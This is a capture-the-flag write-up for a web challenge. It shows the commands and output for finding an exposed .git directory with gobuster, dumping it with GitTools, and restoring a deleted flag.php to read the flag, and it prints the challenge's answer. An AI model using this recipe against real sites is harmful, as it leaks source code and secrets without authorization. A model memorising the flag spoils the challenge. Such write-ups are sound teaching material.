## Maximum Courage
```
Max prefers to learn by practicing and not just reading all day, so he set up a webserver and hopes it stays secret, can you prove it has a weakness?
```
- Link: http://35.197.204.100/maximum/

#### Solve:

- Step 1

    - By running the following command:
        ```commandline
        gobuster dir -u http://35.197.204.100/maximum/ -w /usr/share/wordlists/dirb/common.txt
        ```
    
    - The result of gobuster:
        ```
        /.hta (Status: 403)
        /.git/HEAD (Status: 200)
        /.htaccess (Status: 403)
        /.htpasswd (Status: 403)
        /index.php (Status: 200)
        ```
    
    - We are interested in the files with status *200*
        ```commandline
        /.git/HEAD
        ```
- Step 2

    - Dumping *.git* by using [GitTools](https://github.com/internetwache/GitTools.git) *Dumper*
        ```commandline
        ./gitdumper.sh http://35.197.204.100/maximum/.git/ MaximumCourage
        ```
        where MaximumCourage is the dest-dir
        
    - Extracting info manually
        
        by running
        ```commandline
        >> git status
      
        On branch master
        Changes not staged for commit:
        (use "git add/rm <file>..." to update what will be committed)
        (use "git restore <file>..." to discard changes in working directory)
        deleted:    flag.php
        deleted:    index.php
        no changes added to commit (use "git add" and/or "git commit -a")
        ```
        we see that there is a file named flag.php that we can restore
        
    - Restoring the flag
    
        by running
        ```commandline
        >> git restore flag.php
        >> ls
        flag.php
        ```
        now we see the flag.php file and we can use *cat* to read the file:
    
        ```
        >> cat flag.php
      
        You can't view this flag directly.
        <!-- PHP source doesn't appear on HTML comments -->
        <?php
        exit();
        die();
        $secret_key = 'be607453caada6a05d00c0ea0057f733';
        ?>
        ```
     
> **Flag: be607453caada6a05d00c0ea0057f733**